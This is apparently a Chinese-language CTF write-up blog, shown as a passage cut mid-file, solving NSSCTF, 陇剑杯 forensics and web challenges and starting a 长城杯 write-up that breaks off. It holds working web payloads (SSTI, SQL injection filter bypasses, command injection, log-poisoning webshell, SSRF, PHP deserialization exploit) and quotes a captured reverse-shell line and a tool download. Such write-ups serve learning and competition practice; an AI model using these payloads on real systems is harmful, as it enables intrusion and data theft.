&quot;Uwe Tews&quot;,            &quot;email&quot;: &quot;uwe.tews@googlemail.com&quot;        &#125;,        &#123;            &quot;name&quot;: &quot;Rodney Rehm&quot;,            &quot;email&quot;: &quot;rodney.rehm@medialize.de&quot;        &#125;,        &#123;            &quot;name&quot;: &quot;Simon Wisselink&quot;,            &quot;homepage&quot;: &quot;https://www.iwink.nl/&quot;        &#125;    ],    &quot;support&quot;: &#123;        &quot;issues&quot;: &quot;https://github.com/smarty-php/smarty/issues&quot;,        &quot;forum&quot;: &quot;https://github.com/smarty-php/smarty/discussions&quot;    &#125;,    &quot;require&quot;: &#123;        &quot;php&quot;: &quot;^7.1 || ^8.0&quot;    &#125;,    &quot;autoload&quot;: &#123;        &quot;classmap&quot;: [            &quot;libs/&quot;        ]    &#125;,    &quot;extra&quot;: &#123;        &quot;branch-alias&quot;: &#123;            &quot;dev-master&quot;: &quot;4.0.x-dev&quot;        &#125;    &#125;,    &quot;require-dev&quot;: &#123;        &quot;phpunit/phpunit&quot;: &quot;^8.5 || ^7.5&quot;,        &quot;smarty/smarty-lexer&quot;: &quot;^3.1&quot;    &#125;&#125;\n\n发现是smarty模板,应该是存在模板注入的\n结合题目名称于是在出题人的博客中查到相关知识点\n\ndata=&#123;if system(&#x27;ls /&#x27;)&#125;&#123;/if&#125;\n\n\n\nNSSCTF&#123;d1fca53a-f421-45dd-936f-ef7c8bacfae3&#125;\n\n[陇剑杯 2021]webshell（问2）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客修改了一个日志文件，文件的绝对路径为_____________。\n\n\n搜.log即可\nNSSCTF&#123;/var/www/html/data/Runtime/Logs/Home/21_08_07.log&#125;\n\n[陇剑杯 2021]jwt（问6）昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：黑客在服务器上修改了一个配置文件，文件的绝对路径为_____________。\n\n黑客攻击的请求方式一般是POST，且配置文件一般存放在&#x2F;etc下\nhttp.request.method==“POST”&amp;&amp;http contains “etc”\n\n\nNSSCTF&#123;/etc/pam.d/common-auth&#125;\n\n[陇剑杯 2021]SQL注入（问1）某应用程序被攻击，请分析日志后作答：黑客在注入过程中采用的注入手法叫_____________。（格式为4个汉字，例如“拼搏努力”）\n\n\n看到if 布尔盲注\nNSSCTF&#123;布尔盲注&#125;\n\n[陇剑杯 2021]webshell（问4）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客写入的webshell文件名是_____________。\n\n\nNSSCTF&#123;1.php&#125;\n\n[陇剑杯 2021]webshell（问3）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客获取webshell之后，权限是______？\n\n\n执行了whoami,追踪一下流,没想到是404响应,直接正则搜whoami,看返回包是不是200\n\n终于找到了,再追踪一下流\n\nNSSCTF&#123;www-data&#125;\n\n[陇剑杯 2021]日志分析（问2）单位某应用程序被攻击，请分析日志，进行作答：分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。\n\n直接搜索tmp得到一串url编码过的字符串,解码\nd172.17.0.1 - - [07/Aug/2021:01:38:21  0000] &quot;GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125; HTTP/1.1&quot; 302 879 &quot;-&quot; &quot;python-requests/2.26.0&quot;\n\n文件名为sess_car\nNSSCTF&#123;sess_car&#125;\n\n[陇剑杯 2021]webshell（问5）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客上传的代理工具客户端名字是_____________。\n\n65题知道_POST的参数即连接密码是aaa,搜aaa\n\nNSSCTF&#123;frpc&#125;\n\n[陇剑杯 2021]webshell（问6单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客代理工具的回连服务端IP是_____________\n\n肯定还是找1.php\n\n在这个流里找到了\n\n\nNSSCTF&#123;192.168.239.123&#125;\n\n[陇剑杯 2021]webshell（问7）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）\n\nNSSCTF&#123;0HDFt16cLQJ#JTN276Gp&#125;\n\n[陇剑杯 2021]日志分析（问3）分析攻击流量，黑客使用的是______类读取了秘密文件。\n\nd172.17.0.1 - - [07/Aug/2021:01:38:21  0000] &quot;GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125; HTTP/1.1&quot; 302 879 &quot;-&quot; &quot;python-requests/2.26.0&quot;\n\nNSSCTF&#123;SplFileObject&#125;\n\n[陇剑杯 2021]简单日志分析（问2）黑客查看的秘密文件的绝对路径是_____________。得\n\n\n0S&#x27;cat /Th4s_IS_VERY_Import_Fi1e&#x27;NSSCTF&#123;/Th4s_IS_VERY_Import_Fi1e&#125;\n\n[陇剑杯 2021]简单日志分析（问1）黑客攻击的参数是______。（如有字母请全部使用小写）\n\n见上题,参数即为user\nNSSCTF&#123;user&#125;\n\n[陇剑杯 2021]简单日志分析（问3）黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口&quot;，例如127.0.0.1:2333）。\n\n看到还有一处base64字符串,解码得到\nbash -i +&amp; /dev/tcp/192.168.2.197/8888 0&gt;&amp;1NSSCTF&#123;192.168.2.197:8888&#125;\n\n[陇剑杯 2021]SQL注入（问2-3）最终获取flag的数据库名、表名和字段名是_____________。（格式为“数据库名#表名#字段名”，例如database#table#column）最终获取flag的字符串\n\n在日志里往后看,where语句后面有接着答案\n/index.php?id=1%20and%20if(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=&#x27;flag&#x27;%20and%20table_schema=&#x27;sqli&#x27;),1,1)%20=%20&#x27;s&#x27;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&quot; 200 448 &quot;-&quot; &quot;python-requests/2.26.0&quot;/index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),43,1)%20=%20&#x27;w&#x27;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&quot; 200 427 &quot;-&quot; &quot;python-requests/2.26.0&quot;\n\nNSSCTF&#123;sqli#flag#flag&#125;\n\n下一题,在linux中输入命令\ncat access.log | grep &#x27;select%20flag%20from%20&#x27; | grep -E &quot;478|479|480|481|482&quot; | cut -d &quot;&#x27;&quot; -f 2 &gt; 1.txt\n\nimport urllib.parsea = &#x27;&#x27;with open(&#x27;1.txt&#x27;) as f:    for i in f.readlines():        a += i.strip()print(urllib.parse.unquote(a))\n\n\nflag&#123;deddcd67-bcfd-487e-b940-1217e668c7db&#125;\n\n[陇剑杯 2021]内存分析1.虚拟机的密码是_____________。（密码中为flag&#123;xxxx&#125;，含有空格，提交时不要去掉）\n\n使用mimiktz分析即可\npython2 vol.py --plugins=plugins -f &quot;/home/winter/桌面/volatility/problems/ljb.vmem&quot; --profile=Win7SP1x64 mimikatz\n\n\nNSSCTF&#123;W31C0M3 T0 THiS 34SY F0R3NSiCX&#125;\n\n2.虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____________。（解题过程中需要用到上一题答案中flag&#123;&#125;内的内容进行处理。本题的格式也是flag&#123;xxx&#125;，含有空格，提交时不要去掉）\n\npython2 vol.py --plugins=plugins -f &quot;/home/winter/桌面/volatility/problems/ljb.vmem&quot; --profile=Win7SP1x64 filescan |grep &quot;HUAWEI&quot;\n\n\n得到偏移量0x000000007d8c7d10,dump下来\npython2 vol.py --plugins=plugins -f &quot;/home/winter/桌面/volatility/problems/ljb.vmem&quot; --profile=Win7SP1x64 dumpfiles -Q 0x000000007d8c7d10\n\n查资料还发现 ，由于华为手机助手加密的文件解密时需要依赖整个文件夹中的文件，只有一个images0.tar.enc是不行的。需要另一个exe文件,就是找到的这个文件\ngithub找到华为备份恢复工具https://github.com/RealityNet/kobackupdec\n下载该项目，然后使用命令进行恢复，这个工具需要密码进行恢复，那么密码就是刚刚的第一问的flag，而且提示是“没有空格，只有下划线”\npython3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX &quot;/home/winter/backup_input/HUAWEI P40_2021-aa-bb xx.yy.zz&quot; 4 \n\n然后在文件夹即可找到图片\n\nNSSCTF&#123;TH4NK Y0U FOR DECRYPTING MY DATA&#125;\n\n3.[SWPUCTF 2022 ]ez_sql测试绕过了or union and 和空格但只是简单把这些字符串置空,双写绕过\nnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(database())/**/limit/**/1,1#NSS_dbnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#x27;NSS_db&#x27;limit/**/1,1#NSS_tb,usersnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;NSS_tb&#x27;limit/**/1,1#\n\n\nnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(id,Secr3t,flll444g)/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1#\n\n\nNSSCTF&#123;dafe017f-0830-4583-ad8e-9a0066f166e4&#125;\n\n[MoeCTF 2021]babyRCE&lt;?php$rce = $_GET[&#x27;rce&#x27;];if (isset($rce)) &#123;    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\&gt;|\\&lt;|\\&#x27;|\\&quot;/i&quot;, $rce)) &#123;        system($rce);    &#125;else &#123;        echo &quot;hhhhhhacker!!!&quot;.&quot;\\n&quot;;    &#125;&#125;\n\nGET?rce=c\\at%09f\\lag.php\n\n\nNSSCTF&#123;e312aec7-628d-4856-8b22-70d549b5fae8&#125;\n\n[WUSTCTF 2020]朴实无华dirsearch发现robots.txt,访问&#x2F;fAke_f1agggg.php\n\n访问fl4g.php\n&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123;   $md5=$_GET[&#x27;md5&#x27;];   if ($md5==md5($md5))       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;   else       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123;    $get_flag = $_GET[&#x27;get_flag&#x27;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;\n\n/fl4g.php?num=2019e9&amp;&amp;md5=0e215962017&amp;&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n\n\nNSSCTF&#123;7347029a-b29f-42a0-bdeb-3da09ef31a8c&#125;\n\n[陇剑杯 2021]ios1,2,3一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：黑客所控制的C&amp;C服务器IP是_____________。\n\n导出http对象,查看导出的文件\n\n在wireshark上查找该字符串”ios_agent”\n\nwget https://github.com/ph4ntonn/Stowaway/releases/download/1.6.2/ios_agent\n\n从这个github下载了个文件给予权限后，执行了一些命令,去网站看\n参数:-l 被动模式下的监听地址[ip]:&lt;port&gt;-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致-c 主动模式下的目标节点地址--socks5-proxy socks5代理服务器地址--socks5-proxyu socks5代理服务器用户名(可选)--socks5-proxyp socks5代理服务器密码(可选)--http-proxy http代理服务器地址--down 下游协议类型,默认为裸TCP流量,可选HTTP/WS--tls-enable 为节点通信启用TLS，在启用TLS后，AES加密将被禁用--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址--heartbeat 开启心跳包\n\n\n前三题答案已出\nNSSCTF&#123;3.128.156.159&#125;NSSCTF&#123;stowaway&#125;NSSCTF&#123;hack4sec&#125;\n\n4.一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：黑客通过SQL盲注拿到了一个敏感数据，内容是____________\n\n流量包内存在tls流量,使用附件里的keylog.txt解密https流量\n编辑——首选项——protocols——TLS——导入keylog.txt\n导入后就可以在这里搜索http2，看到解密后的数据了\n\n题目上说黑客通过SQL盲注拿到了一个敏感数据。我们在分组列表中搜索select，可以看到是盲注\n\n一个个把十六进制的值提取出来\n746558f3-c841-456b-85d7-d6c0f2edabb2NSSCTF&#123;746558f3-c841-456b-85d7-d6c0f2edabb2&#125;\n\n6.黑客端口扫描的扫描器的扫描范围是**__**。\n端口扫描会涉及到TCP的RST\n\nRST表示复位，用来异常的关闭连接，在TCP的设计中它是不可或缺的。就像上面说的一样，发送RST包关闭连接时，不必等缓冲区的包都发出去（不像上面的FIN包），直接就丢弃缓存区的包发送RST包。而接收端收到RST包后，也不必发送ACK包来确认。 TCP处理程序会在自己认为的异常时刻发送RST包。例如，A向B发起连接，但B之上并未监听相应的端口，这时B操作系统上的TCP处理程序会发RST包。\n\n既然是端口扫描，必然会涉及到rst报文和连续端口访问，我们打开专家信息找到rst\n\n\n从10-499都有RST包\nNSSCTF&#123;10-499&#125;\n\n[HNCTF 2022 WEEK2]easy_include&lt;?php//WEB手要懂得搜索if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    if(preg_match(&quot;/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i&quot;, $file))&#123;        die(&quot;error&quot;);    &#125;    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\nfile没ban,*也过滤了,尝试日志写马\n?file=file:///var/log/nginx/access.logua头:&lt;?php system(&#x27;cat /f*&#x27;)?&gt;\n\n\nNSSCTF&#123;369b1fe1-de00-44fb-b9df-1d66cda1c443&#125;\n\n[HNCTF 2022 WEEK2]ez_ssrf\n进来一个apache默认界面发现是2.4.38,上网搜一下漏洞\nhttps://www.cnblogs.com/jdslf/p/16846682.html\ndirsearch扫描到index.php\n&lt;?phphighlight_file(__FILE__);error_reporting(0);$data=base64_decode($_GET[&#x27;data&#x27;]);$host=$_GET[&#x27;host&#x27;];$port=$_GET[&#x27;port&#x27;];$fp=fsockopen($host,intval($port),$error,$errstr,30);//建立一个 socket 连接,接收$host主机参数，$port端口参数（先会被转为整数），$error为错误号，设为非0；$errstr (错误信息): 如果连接失败，这个参数会包含一个字符串描述的错误信息。30秒超时if(!$fp) &#123;/// 如果$fp有错误，也就是返回的是非0，取反为0，执行退出    die();&#125;else &#123;    fwrite($fp,$data);// fwrite函数接收$fp编码后的数据    while(!feof($data))//feof判断是否达到数据末尾    &#123;        echo fgets($fp,128);// 输出 fgets，fgets接收来自$fp的数据，并且读取最大128个字节数    &#125;    fclose($fp);&#125;\n\n那我们可以ssrf,伪造一个http请求头,让socket和127.0.0.1连接,把构造的数据写入到连接的 socket 中,再从连接中读取返回的响应数据\n&lt;?php$out = &quot;GET /flag.php HTTP/1.1\\r\\n&quot;;$out .= &quot;Host: 127.0.0.1\\r\\n&quot;;$out .= &quot;Connection: Keep-Alive\\r\\n\\r\\n&quot;;echo $out;echo base64_encode($out)?&gt;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==\n\n\nnssctf&#123;095948b9b2be-8444-3750-99ba94d3b4f5&#125;\n\n[第五空间 2021]pklovecloud&lt;?php  include &#x27;flag.php&#x27;;class pkshow &#123;      function echo_name()         &#123;                  return &quot;Pk very safe^.^&quot;;          &#125;  &#125; class acp &#123;       protected $cinder;      public $neutron;    public $nova;    function __construct()     &#123;              $this-&gt;cinder = new pkshow;    &#125;      function __toString()          &#123;                  if (isset($this-&gt;cinder))              return $this-&gt;cinder-&gt;echo_name();          &#125;  &#125;  class ace&#123;        public $filename;         public $openstack;    public $docker;     function echo_name()          &#123;           $this-&gt;openstack = unserialize($this-&gt;docker);        $this-&gt;openstack-&gt;neutron = $heat;        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)        &#123;        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;            if (file_get_contents($file))                     &#123;                              return file_get_contents($file);             &#125;              else             &#123;                 return &quot;keystone lost~&quot;;             &#125;            &#125;    &#125;  &#125;  if (isset($_GET[&#x27;pks&#x27;]))  &#123;    $logData = unserialize($_GET[&#x27;pks&#x27;]);    echo $logData; &#125; else &#123;     highlight_file(__file__); &#125;?&gt;\n\n通过ace类里的echo_name方法include flag.php,发现acp里有__tostring方法,再看到ace类里有echo $logData这一句,我们把$logData设置为acp对象即可触发__tostring方法\nfunction __construct() &#123;          $this-&gt;cinder = new ace;&#125;\n\n然后看echo_name方法,不让他反序列化就自然绕过if了,那么就让$docker&#x3D;null即可,这样$openstac也为null\nexp:\n&lt;?phpclass pkshow&#123;    function echo_name()    &#123;        return &quot;Pk very safe^.^&quot;;    &#125;&#125;class acp&#123;    protected $cinder;    public $neutron;    public $nova;    function __construct()    &#123;        $this-&gt;cinder = new ace;    &#125;    function __toString()    &#123;    &#125;&#125;class ace&#123;    public $filename=&#x27;flag.php&#x27;;    public $openstack;    public $docker=null;&#125;$a= new acp();echo urlencode(serialize($a));?&gt;O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D\n\n\nflag在&#x2F;nssctfasdasdflag,改一下filename即可,改一次不行,改成..&#x2F;才对\n\nNSSCTF&#123;f356c7e2-a4bc-47d2-8e8c-b1c8854afb71&#125;\n\n[HNCTF 2022 WEEK3]ssssti猜到参数是name,试继承链的时候顺便测试一下waf,fenjing一把梭\npython -m fenjing crack -u http://node5.anna.nssctf.cn:29433/ --method GET --inputs name\n\n\nNSSCTF&#123;e5b9ec3b-6c84-4b83-a887-bb1e78e1513c&#125;\n\n","categories":["nssctf"],"tags":["nssctf"]},{"title":"京津冀长城杯初赛wp","url":"/2025/09/17/%E4%BA%AC%E6%B4%A5%E5%86%80%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/","content":"京津冀ccb文曲签学f12得到逻辑代码\nconst fnKey = document.getElementById(&#x27;fnKey&#x27;);const capsKey = document.getElementById(&#x27;capsKey&#x27;);const searchKey = document.getElementById(&#x27;searchKey&#x27;);const clearKey = document.getElementById(&#x27;clearKey&#x27;);const inputBox = document.getElementById(&#x27;inputBox&#x27;);const screenContent = document.getElementById(&#x27;screenContent&#x27;);const debugHint = document.getElementById(&#x27;debugHint&#x27;);const capsHint = document.getElementById(&#x27;capsHint&#x27;);const keys = document.querySelectorAll(&#x27;.key&#x27;);const menuKey = document.getElementById(&#x27;menuKey&#x27;);const backKey = document.getElementById(&#x27;backKey&#x27;);// 状态变量let debugMode = false;let isUpperCase = true; // 默认大写let fnPressTimer = null;const FN_HOLD_DURATION = 1500; // 长按Fn键激活调试模式的时间(毫秒)let isMenuActive = false; // 菜单激活状态（true=处于菜单选择中，false=普通输入）// Fn键长按激活调试模式fnKey.addEventListener(&#x27;mousedown&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    fnPressTimer = setTimeout(() =&gt; &#123;        debugMode = !debugMode;        if (debugMode) &#123;            addScreenMessage(&quot;[调试模式已激活]&quot;, &quot;text-yellow-300&quot;);            debugHint.style.display = &#x27;block&#x27;;        &#125; else &#123;            addScreenMessage(&quot;[调试模式已关闭]&quot;, &quot;text-red-400&quot;);            debugHint.style.display = &#x27;none&#x27;;        &#125;    &#125;, FN_HOLD_DURATION);&#125;);fnKey.addEventListener(&#x27;mouseup&#x27;, function() &#123;    this.classList.remove(&#x27;key-press&#x27;);    clearTimeout(fnPressTimer);&#125;);fnKey.addEventListener(&#x27;mouseleave&#x27;, function() &#123;    this.classList.remove(&#x27;key-press&#x27;);    clearTimeout(fnPressTimer);&#125;);// 大小写切换功能capsKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);        isUpperCase = !isUpperCase;    if (isUpperCase) &#123;        this.classList.add(&#x27;caps-active&#x27;);        capsHint.style.display = &#x27;block&#x27;;        addScreenMessage(&quot;[大写模式]&quot;, &quot;text-red-400&quot;);    &#125; else &#123;        this.classList.remove(&#x27;caps-active&#x27;);        capsHint.style.display = &#x27;none&#x27;;        addScreenMessage(&quot;[小写模式]&quot;, &quot;text-green-400&quot;);    &#125;&#125;);// 字母键点击事件（核心：菜单状态下A/B/C触发选择，其他键正常输入）keys.forEach(key =&gt; &#123;    key.addEventListener(&#x27;click&#x27;, function() &#123;        this.classList.add(&#x27;key-press&#x27;);        setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);                const keyChar = this.textContent; // 获取当前按键的字符（A/B/C/其他）        // 1. 菜单激活状态：优先处理A/B/C选择        if (isMenuActive) &#123;            if ([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;].includes(keyChar)) &#123;                handleMenuSelection(keyChar); // 触发菜单选择逻辑            &#125; else &#123;                // 非A/B/C键提示无效                addScreenMessage(`[无效选择] 请按A/B/C`, &quot;text-red-400&quot;);            &#125;            return; // 菜单状态下不执行普通输入        &#125;        // 2. 普通输入状态：处理所有字母键输入        let inputChar = keyChar;        // 根据大小写模式转换字符（#号不转换）        if (!isUpperCase &amp;&amp; keyChar !== &#x27;#&#x27;) &#123;            inputChar = inputChar.toLowerCase();        &#125;        inputBox.value += inputChar;        inputBox.focus();    &#125;);&#125;);// 菜单键功能（更新菜单选项为A/B/C）menuKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);        // 切换菜单状态    if (!isMenuActive) &#123;        isMenuActive = true;        addScreenMessage(&quot;[菜单已激活]&quot;);        addScreenMessage(&quot;A. 天气&quot;); // A对应查词        addScreenMessage(&quot;B. 游戏&quot;); // B对应游戏        addScreenMessage(&quot;C. 设置&quot;); // C对应设置        inputBox.value = &quot;&quot;; // 清空输入框，避免干扰    &#125; else &#123;        isMenuActive = false;        addScreenMessage(&quot;[菜单已关闭]&quot;);        addScreenMessage(&quot;返回普通输入模式&quot;);    &#125;&#125;);// 核心：处理菜单选择（A/B/C对应不同功能回显）function handleMenuSelection(key) &#123;    switch(key) &#123;        case &quot;A&quot;:            addScreenMessage(&quot;&gt; A&quot;); // 回显选择的按键            addScreenMessage(&quot;今天天气很好，记得继续保持好心情呀～&quot;);            isMenuActive = false; // 选择后自动退出菜单，允许输入单词            break;        case &quot;B&quot;:            addScreenMessage(&quot;&gt; B&quot;);            addScreenMessage(&quot;『英雄坛说』加载中...&quot;);            addScreenMessage(&quot;（抱歉呀，你手里这台98年产的文曲星，还停留在按键敲出清脆声响的年代，2007年的游戏，它还不认识呢～）&quot;);            isMenuActive = false;            break;        case &quot;C&quot;:            addScreenMessage(&quot;&gt; C&quot;);            addScreenMessage(&quot;当前配置：&quot;);            addScreenMessage(&quot;  亮度：50% | 音量：0%&quot;);            addScreenMessage(&quot;(这台文曲星实在太老啦，按键边缘都磨出了包浆，连基础设置功能都早已歇业，再也调不了背光亮度啦～)&quot;);            isMenuActive = false;            break;        default:            addScreenMessage(`&gt; $&#123;key&#125;`);            addScreenMessage(&quot;[错误] 请按A/B/C选择&quot;, &quot;text-red-400&quot;);    &#125;&#125;// 返回键功能（菜单状态下按返回键关闭菜单）backKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);        // 菜单状态下优先关闭菜单    if (isMenuActive) &#123;        isMenuActive = false;        addScreenMessage(&quot;[返回] 菜单已关闭&quot;);        inputBox.value = &quot;&quot;;        return;    &#125;        // 普通状态下删除最后一个字符    if (inputBox.value.length &gt; 0) &#123;        inputBox.value = inputBox.value.slice(0, -1);    &#125; else &#123;        addScreenMessage(&quot;[返回上级]&quot;);    &#125;&#125;);// 查词/执行指令功能（保留原有逻辑）searchKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);        const input = inputBox.value.trim();    if (!input) &#123;        addScreenMessage(&quot;请输入内容&quot;);        return;    &#125;    addScreenMessage(`&gt; $&#123;input&#125;`);        // 发送请求到后端    fetch(&#x27;handler.php&#x27;, &#123;        method: &#x27;POST&#x27;,        headers: &#123;            &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,        &#125;,        body: `action=$&#123;debugMode ? &#x27;command&#x27; : &#x27;lookup&#x27;&#125;&amp;content=$&#123;encodeURIComponent(input)&#125;`    &#125;)    .then(response =&gt; response.text())    .then(data =&gt; &#123;        if (data.includes(&#x27;ERROR:&#x27;)) &#123;            addScreenMessage(data.replace(&#x27;ERROR:&#x27;, &#x27;&#x27;), &#x27;text-red-400&#x27;);        &#125; else &#123;            const displayData = data.replace(/\\n/g, &#x27;&lt;br&gt;&#x27;);            addScreenMessage(displayData);        &#125;    &#125;)    .catch(error =&gt; &#123;        addScreenMessage(`请求失败: $&#123;error.message&#125;`, &#x27;text-red-400&#x27;);    &#125;);&#125;);// 清空功能（清空时关闭菜单）clearKey.addEventListener(&#x27;click&#x27;, function() &#123;    this.classList.add(&#x27;key-press&#x27;);    setTimeout(() =&gt; this.classList.remove(&#x27;key-press&#x27;), 100);    inputBox.value = &#x27;&#x27;;        // 菜单状态下清空时同步关闭菜单    if (isMenuActive) &#123;        isMenuActive = false;        addScreenMessage(&quot;[菜单已关闭] 输入已清空&quot;);    &#125; else &#123;        addScreenMessage(&quot;已清空输入&quot;);    &#125;&#125;);// 屏幕消息添加函数function addScreenMessage(message, className = &#x27;&#x27;) &#123;    const p = document.createElement(&#x27;p&#x27;);    p.innerHTML = message;    if (className) &#123;        p.className = className;    &#125;    screenContent.appendChild(p);    // 自动滚动到底部    screenContent.scrollTop = screenContent.scrollHeight;&#125;// 键盘输入处理（支持键盘A/B/C选择菜单）document.addEventListener(&#x27;keydown&#x27;, function(e) &#123;    // 阻止默认行为，避免重复输入    if (/^[a-z#]$/i.test(e.key) || e.key === &#x27;Backspace&#x27; || e.key === &#x27;Enter&#x27;) &#123;        e.preventDefault();    &#125;        const key = e.key.toUpperCase(); // 统一转为大写处理（兼容大小写输入）    // 菜单状态下，优先处理A/B/C键（键盘输入）    if (isMenuActive &amp;&amp; [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;].includes(key)) &#123;        handleMenuSelection(key);        return;    &#125;    // 普通输入状态处理    if (/^[A-Z]$/.test(key)) &#123;        let inputChar = isUpperCase ? key : key.toLowerCase();        inputBox.value += inputChar;    &#125; else if (key === &#x27;#&#x27;) &#123;        inputBox.value += &#x27;#&#x27;;    &#125; else if (e.key === &#x27;Enter&#x27;) &#123;        searchKey.click();    &#125; else if (e.key === &#x27;Backspace&#x27;) &#123;        backKey.click(); // 复用返回键逻辑（含菜单关闭）    &#125; else if (e.key === &#x27;Escape&#x27;) &#123;        clearKey.click(); // 复用清空键逻辑（含菜单关闭）    &#125; else if (e.key === &#x27;CapsLock&#x27;) &#123;        capsKey.click(); // 同步系统大小写    &#125;&#125;);    \n\n发现存在调试模式,长按Fn即可进入\n发现可以输入#HELP\n\n\n\n得到提示\n提示：flag在/flag下，可以尝试目录穿越漏洞来读取它。会过滤“../”，可以使用双写来绕过。文件名有大小写区分。\n\n#read 